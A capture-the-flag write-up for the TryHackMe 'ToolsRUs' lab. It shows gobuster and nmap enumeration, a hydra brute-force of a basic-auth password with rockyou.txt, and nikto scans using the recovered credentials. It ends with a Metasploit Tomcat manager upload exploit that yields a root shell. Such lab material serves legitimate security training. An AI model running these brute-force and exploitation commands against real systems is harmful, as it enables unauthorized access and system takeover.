```
  _____                     _              ___                   
 |_   _|   ___     ___     | |     ___    | _ \   _  _     ___   
   | |    / _ \   / _ \    | |    (_-<    |   /  | +| |   (_-<   
  _|_|_   \___/   \___/   _|_|_   /__/_   |_|_\   \_,_|   /__/_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
```
Practise using tools such as `dirbuster`, `hydra`, `nmap`, `nikto` and `metasploit`. [^1]

What directory can you find, that begins with a "g"?
-----------------------------------------------------------------------------------------
Upon accessing the website at the target IP address, we are informed that the *ToolsRUs*
website is under maintanance and that other parts of the website are still functional.
So, we use `gobuster` to iterate through the website directory listing. 
```
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_MACHINE_IP> \
    -x php,html,txt -t 40 -o gobuster_scan.txt
```
This returns a list of directories and websites, where there is only one starting with a
"g". Further, to get an overview of the target system, we run a `nmap -sS` scan with
the IP address and are prompted with these open ports and services.
```
PORT        STATE   SERVICE
22/tcp      open    ssh
80/tcp      open    http
1234/tcp    open    hotline
8009/tcp    open    ajp13
```

Whose name can you find from this directory?
-----------------------------------------------------------------------------------------
Upon opening the browser and navigating to `http://<TARGET_MACHINE_IP>/guidelines` a
developer is being asked whether they updated the "TomCat" server.

What directory has basic authentication?
-----------------------------------------------------------------------------------------
Based of the `gobuster` directory scan listing, we suspect the `protected/`
directory to have basic authentication and check it in the browser. And indeed, after
navigating to this page, we are prompted to sign in.

What is bob's password to the protected part of the website?
-----------------------------------------------------------------------------------------
Once again, we open the `http://<TARGET_MACHINE_IP>/protected/` website in the network
tab of the developer tools open and find out, that a HTTP *GET* form is sent. So, we can 
apply the following `hydra` command to brute force the password for the user *bob*.

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f <TARGET_IP_ADDRESS> http-get /protected
```
This gives us the password for the user *bob* and upon logging in, we are informed that
the protected page has moved to a different port.

What other port that serves a web service is open on the machine?
-----------------------------------------------------------------------------------------
For this, we rely on the previous `nmap` results from the first task and thus get the
port *1234* with the service *hotline*.

What is the name and version of the software running on this port?
-----------------------------------------------------------------------------------------
After accessing the website `http://<TARGET_IP_ADDRESS>:1234` in the browser, we can see
the *Apache Tomcat/7.0.88* default documentation page.

Use Nikto with the found credentials and scan the `/manager/html` directory on the port.
How many documentation files did Nikto identify?
-----------------------------------------------------------------------------------------
With `nikto` we can scan the host with on the *1234* port in the `/manager/html`
directory and thus find five files that were classified as documentation.
```
nikto -h http://<TARGET_MACHINE_IP>:1234/manager/html -id bob:bubbles -o niktoscan.txt
```

What is the server version?
-----------------------------------------------------------------------------------------
The hint advises us to run the `nikto` command against the port *80* and so we use the
command `nikto -h http://<TARGET_MACHINE_IP>:80` to find out it is *Apache/2.4.18*.
This now also explains the note on the earlier page to the developer *bob* if they 
updated the Apache *TomCat* server.

What version of Apache-Coyote is this service using?
-----------------------------------------------------------------------------------------
For this task, it is best to use a `nmap` scan to query more information
`nmap -sV -A -T4 -vv <TARGET_IP> -oN nmapscan.txt`.
This way, we can search for *Coyote* in the output file and find out version *1.1*.

Use Metasploit to exploit the service and get a shell on the system. What user did you
get a shell as?
-----------------------------------------------------------------------------------------
First, we launch the `msfconsole` and then ask ourselves what exploit to use.
Based of the `search apache tomcat` result we select exploits with an excellent
rank and then select the `exploit/multi/http/tomcat_mgr_upload` module. The
`show options` output then tells us to set the directory path, host IP address, port,
HTTP password and username appropriately.
```
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS <TARGET_IP_ADDRESS>
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTPUSERNAME bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTPPASSWORD bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > run
meterpreter > shell
```
Finally, we can enter `whoami` which results in the user *root*, but note the missing
shell prompt.

What flag is found in the root directory?
-----------------------------------------------------------------------------------------
After moving to `/root` in the shell with the missing prompt, we discover the `flag.txt`
file.

[^1]: https://tryhackme.com/room/toolsrus
